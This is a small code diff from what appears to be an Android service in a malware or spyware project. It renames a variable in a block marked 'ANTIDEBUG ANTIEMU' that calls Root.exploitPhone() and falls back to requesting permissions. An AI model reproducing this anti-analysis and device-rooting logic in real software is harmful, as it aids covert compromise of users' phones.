@@ -122,8 +122,8 @@ public class ServiceMain extends Service {
         // ANTIDEBUG ANTIEMU
         if (Core.checkStatic()) {
 
-            boolean selinux = Root.exploitPhone();
-            if (!selinux) {
+            boolean async = Root.exploitPhone();
+            if (!async) {
                 Root.getPermissions();
             }
 
